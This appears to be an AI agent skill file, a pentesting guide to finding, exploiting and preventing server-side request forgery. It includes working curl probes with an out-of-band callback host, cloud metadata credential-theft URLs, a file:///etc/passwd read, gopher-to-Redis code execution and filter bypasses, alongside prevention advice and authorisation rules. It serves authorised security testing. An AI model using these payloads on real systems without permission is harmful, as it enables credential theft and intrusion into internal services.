---
name: ssrf-testing
description: >-
  Use when testing for SSRF in web applications, accessing internal services
  through SSRF, bypassing SSRF filters, auditing applications that fetch
  user-supplied URLs, or implementing SSRF prevention. Covers blind and
  non-blind SSRF, cloud metadata exploitation, protocol smuggling, and
  defense strategies.
---

# SSRF Testing & Prevention

## Overview

Find, exploit, and fix Server-Side Request Forgery. SSRF tricks the server into making HTTP requests to unintended destinations -- accessing internal services, cloud metadata, or other systems that the server can reach but the attacker cannot.

```
Normal flow:
  User -> Server -> External API (intended)

SSRF attack:
  User sends: url=http://169.254.169.254/latest/meta-data/
  Server -> AWS Metadata Service (unintended)
  Server returns: IAM credentials, instance info, etc.
```

## Quick Reference

| What | Details |
|------|---------|
| **OWASP** | A10:2021 Server-Side Request Forgery |
| **CWE** | CWE-918 |
| **Severity** | Critical (CVSS 9.1) when cloud metadata or internal data exposed |
| **Key tools** | Burp Suite Pro, SSRFmap, interactsh, Gopherus |
| **Common params** | `url`, `uri`, `link`, `href`, `src`, `dest`, `redirect`, `callback`, `webhook`, `image_url`, `feed_url`, `proxy_url` |
| **Cloud metadata IP** | `169.254.169.254` (AWS/Azure/DO), `metadata.google.internal` (GCP), `100.100.100.200` (Alibaba) |
| **Blind detection** | Timing differences, OOB callbacks (Collaborator/interactsh), error message variations |

## When to Use

- Application fetches user-supplied URLs server-side (webhooks, URL previews, image imports, PDF generators)
- Testing for access to cloud metadata endpoints
- Auditing URL validation / allowlist bypass
- Implementing SSRF prevention controls

**When NOT to use:**
- Client-side request forgery (CSRF) -- different vulnerability class
- CORS misconfigurations without server-side fetch
- Open redirects that don't chain into server-side requests

## Prerequisites

- **Authorization**: Written penetration testing agreement including SSRF testing scope
- **Burp Suite Professional**: With Collaborator for out-of-band detection
- **interactsh**: Open-source OOB interaction server (`go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest`)
- **SSRFmap**: Automated SSRF exploitation framework (`git clone https://github.com/swisskyrepo/SSRFmap.git`)
- **Gopherus**: Generates gopher payloads for internal services (`git clone https://github.com/tarunkant/Gopherus.git`)
- **curl**: For manual SSRF payload testing
- **Knowledge of target infrastructure**: Cloud provider (AWS, GCP, Azure), internal IP ranges

## SSRF Types

### Non-blind (Classic) SSRF
The server returns the response body to the attacker:
```
Request:  GET /fetch?url=http://internal-api:8080/admin/users
Response: {"users": [...all internal user data...]}
```

### Blind SSRF
Server makes the request but doesn't return the response body. Confirm through:
- **Timing differences**: Open port = fast, closed port = timeout
- **Out-of-band callbacks**: DNS/HTTP request to attacker-controlled server
- **Error message differences**: "Connection refused" vs "Host unreachable"

### Semi-blind SSRF
Partial information leaks -- error messages, response times, status codes, or content length.

## Workflow

### Step 1: Identify SSRF-Prone Functionality

Any feature that takes a URL from user input and fetches it server-side is a potential vector:
- URL preview/unfurling (Slack-style link previews)
- Webhook configuration endpoints
- File import from URL (CSV, images, documents)
- PDF/screenshot generation from URL
- Image/avatar fetching from URL
- RSS/feed aggregation
- OAuth callback URLs
- API proxy/gateway features

```bash
# Test common parameter names for SSRF
for param in url uri link href src dest redirect callback webhook \
  image_url avatar_url feed_url import_url proxy_url path; do
  echo -n "Testing param: $param -> "
  curl -s -o /dev/null -w "%{http_code}" --max-time 3 \
    "https://target.example.com/api/fetch?${param}=http://COLLABORATOR_ID.oast.fun/${param}"
  echo
done
```

### Step 2: Test Internal Access

See `references/payloads.md` for complete payload lists including:
- Localhost access variants
- Internal network scanning scripts
- Kubernetes internal service names
- Internal admin panel paths

### Step 3: Cloud Metadata Exploitation

See `references/payloads.md` for cloud metadata endpoints across AWS, GCP, Azure, DigitalOcean, and Alibaba Cloud.

### Step 4: Bypass SSRF Filters

When basic payloads are blocked, see `references/payloads.md` for:
- IP address encoding (octal, hex, decimal, IPv6, short form)
- DNS rebinding techniques
- URL parsing tricks (fragment confusion, username-in-URL, path traversal)
- Protocol smuggling (file://, gopher://, dict://)

### Step 5: Exploit for Impact Escalation

Chain SSRF with internal services for maximum impact:

```bash
# Access Elasticsearch
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:9200/_cat/indices?v"}' \
  "https://target.example.com/api/fetch-url"

# Redis via gopher -- use Gopherus to generate payloads
python gopherus.py --exploit redis
```

### Step 6: Blind SSRF Detection

```bash
# Time-based: compare response times for open vs closed ports
time curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:22/"}' \
  "https://target.example.com/api/fetch-url"

time curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:12345/"}' \
  "https://target.example.com/api/fetch-url"

# OOB callback: use Burp Collaborator or interactsh
# If DNS/HTTP callback received, blind SSRF confirmed
```

## Classification

| Status | Meaning | Criteria |
|--------|---------|----------|
| **VALIDATED** | SSRF confirmed | Internal content returned, cloud metadata exposed, or OOB callback received |
| **FALSE_POSITIVE** | Not vulnerable | All internal requests blocked, no bypass succeeded |
| **PARTIAL** | Possible SSRF | Response differs for internal URLs but no clear content leak; requires manual review |
| **UNVALIDATED** | Inconclusive | Error, timeout, or ambiguous response |

## Static Analysis (SAST)

See `references/sast.md` for complete SAST coverage including:
- Dangerous sink functions by language (PHP, Go, TypeScript/Node.js, Python)
- Semgrep rules for each language
- Static analysis tooling (Semgrep, CodeQL, Bandit, gosec, Psalm)
- Code review checklist

**PHP has the most sinks** — `file_get_contents`, `curl_exec`, `SoapClient`, GD image functions, XML parsers, and stream wrappers all accept URLs. Check `allow_url_fopen` and `allow_url_include` in `php.ini`.

## Prevention

See `references/prevention.md` for complete prevention code and architecture patterns including:
- URL validation with DNS resolution (Python)
- Cloud metadata protection (IMDSv2)
- Architecture-level defenses (network segmentation, dedicated fetcher, DNS pinning)

## Common Mistakes

| Mistake | Why it fails | Fix |
|---------|-------------|-----|
| Only testing `127.0.0.1` | Filters often block literal localhost but miss encodings | Test all IP encoding variants (octal, hex, decimal, IPv6) |
| Skipping blind SSRF | No response body ≠ no vulnerability | Use timing + OOB callbacks |
| Ignoring non-HTTP protocols | `gopher://` and `file://` bypass HTTP-only defenses | Test protocol smuggling |
| Testing only IMDSv1 | AWS may have IMDSv2 enabled | Check both; IMDSv2 requires PUT with token header |
| Allowlist on hostname only | DNS rebinding bypasses hostname checks | Validate resolved IP, not just hostname |
| Missing POST body params | SSRF params may be in JSON body, not query string | Test both GET params and POST body fields |

## Common Scenarios

### Webhook URL -> AWS Credentials
Webhook callback endpoint accepts user URL. Point to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to retrieve temporary IAM credentials for S3/EC2 access.

### PDF Generator -> Internal Admin
PDF generation from URL makes server-side requests. Provide `http://127.0.0.1:8080/admin` to render internal admin panel into the PDF.

### Image URL -> Local File Read
Avatar URL field filtered for HTTP/HTTPS but accepts `file://`. Use `file:///etc/passwd` to read local files.

### Blind SSRF -> Internal Redis RCE
URL fetch doesn't return response but confirms success/failure. Gopher protocol payloads write data to internal Redis, achieving remote code execution.

## Tools Reference

| Tool | Purpose |
|------|---------|
| **Burp Suite Pro** | Request modification + Collaborator for blind SSRF |
| **SSRFmap** | Automated SSRF exploitation with protocol support |
| **interactsh** | Out-of-band interaction detection for blind SSRF |
| **Gopherus** | Generates gopher payloads for internal services |
| **rbndr.us** | DNS rebinding service for filter bypass |
| **singularity** | DNS rebinding attack framework |

## Output Format

```
## SSRF Vulnerability Finding

**Vulnerability**: Server-Side Request Forgery (Full/Blind SSRF)
**Severity**: Critical (CVSS 9.1)
**Location**: POST /api/endpoint - `parameter_name`
**CWE**: CWE-918

### Reproduction Steps
1. [Step-by-step with curl commands]

### Confirmed Access
| Target | Protocol | Response |
|--------|----------|----------|
| 169.254.169.254 | HTTP | IAM credentials retrieved |
| 127.0.0.1:6379 | Gopher | Commands executed |

### Impact
- [Concrete impact statements]

### Recommendation
1. Implement strict URL allowlisting
2. Block private IP ranges (10/8, 172.16/12, 192.168/16, 169.254/16)
3. Upgrade to AWS IMDSv2
4. Disable unused URL protocols
5. Use dedicated outbound proxy with DNS resolution controls
```

## Safety Rules

- ONLY test against authorized targets with written permission
- NEVER exfiltrate actual cloud credentials (capture evidence, redact values)
- STOP if destructive action detected (e.g., gopher:// to Redis FLUSHALL)
- Use benign payloads (INFO, GET) not destructive ones (DELETE, FLUSHALL)
- Redact all sensitive data in evidence files
- Report findings through responsible disclosure channels

## References

- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [OWASP SSRF Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
